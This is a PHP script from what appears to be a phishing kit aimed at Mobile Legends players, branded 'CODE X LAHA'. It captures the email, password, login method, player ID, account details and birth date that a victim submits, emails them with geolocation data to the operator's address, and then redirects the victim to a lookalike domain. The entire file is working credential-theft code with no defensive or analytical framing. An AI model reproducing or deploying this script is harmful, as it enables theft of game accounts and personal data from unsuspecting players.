<?php 
include 'alexBackEnd/geolocation.php';
include 'mailman.php';
$sessionRess = sessionRess();

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$nick = $_POST['nickname'];
$playid = $_POST['playid'];
$zoneid = $_POST['zoneid'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$skin = $_POST['skin'];
$yyyy = $_POST['year'];
$mm = $_POST['month'];
$dd = $_POST['day'];
   
// KONTEN RESULT AKUN
	$topic = "$arpantek_code - $arpantek_flag | $arpantek_callcode | LEVEL $level | $email | $login";

    $message = '

    <center> 
        <div border="1" style="border-collapse: collapse; border: 1px solid black; background: url('.$banner.') no-repeat center center; background-size: 100% 100%; width: 294; height: 200px; color: #000; text-align: center;"></div>
        <div style="border-collapse: collapse; border-color: white; background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Account Information | Sent : '.$codexlaha.'</div>
        <table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
            <tr>
                <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>EMAIL/USERNAME</th>
                <th style="width: 60%; text-align: center;"><b>'.$email.'</th> 
            </tr>
            <tr>
                <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>PASSWORD</th>
                <th style="width: 60%; text-align: center;"><b>'.$password.'</th> 
            </tr>
            <tr>
            	<th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>LOGIN DENGAN</th>
                <th style="width: 60%; text-align: center;"><b>'.$login.'</th> 
            </tr>
            <tr>
                <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>ID PLAYER</th>
                <th style="width: 60%; text-align: center;"><b>'.$playid.' ('.$zoneid.')</th> 
            </tr>
            <tr>
                <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>NICK AKUN</th>
                <th style="width: 60%; text-align: center;"><b>'.$nick.'</th> 
            </tr>
            <tr>
                <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>LEVEL AKUN</th>
                <th style="width: 60%; text-align: center;"><b>'.$level.'</th> 
            </tr>
            <tr>
                <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>TIER AKUN</th>
                <th style="width: 60%; text-align: center;"><b>'.$tier.'</th> 
            </tr>
            <tr>
            	<th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>SKIN AKUN</th>
                <th style="width: 60%; text-align: center;"><b>'.$skin.'</th> 
            </tr>
            <tr>
            	<th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>TTL</th>
                <th style="width: 60%; text-align: center;"><b>'.$dd.' - '.$mm.' - '.$yyyy.'</th> 
            </tr>
        </table>
        <div style="border-collapse: collapse; border-color: white; background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">More Information</div>
        '.$more.'
        <br />
        <table style="border-collapse: collapse; border-color: black; background: #fff; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px;" width="100%" border="1">
            <tr>
                <th style="width: 100%; text-align: center; font-size: 30px;" height="25px"><b>'.$arpantek_code.' '.$arpantek_flag.' '.$arpantek_country.'</th>
            </tr>
            <tr>
                <th style="padding-left: 10px; width: 100%; text-align: center; font-size: 13px;" height="25px"><b>© 2018-'.$yearNow.' CODE X LAHA All Right Reserved</th>
            </tr>
        </table>
    </center>
    <br />
    <b style="font-size:13px;">Session : '.$sessionRess.'</b>
    
    ';
$headers  = "".'MIME-Version: 1.0'."\r\n";
$headers .= "".'Content-type: text/html; charset=utf-8'."\r\n";
$headers .= "".$sender."\r\n";
$headers .= "".'Content-Transfer-Encoding: 8bit'."\r\n";
$headers .= "".'Sensitivity: Company-Confidential'."\r\n";
$headers .= "".'X-Mailer: PHP/'.phpversion()."\r\n";
$send = mail($emailku, $topic, $message, $headers);

// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
if($send) {
echo "<form id='CODEXLAHA' method='POST' action='https://mobllelegends.com/?r=1'>
<input type='hidden' name='nick' value='$nick'>
</form>
<script type='text/javascript'>document.getElementById('CODEXLAHA').submit();</script>";
}
?>



 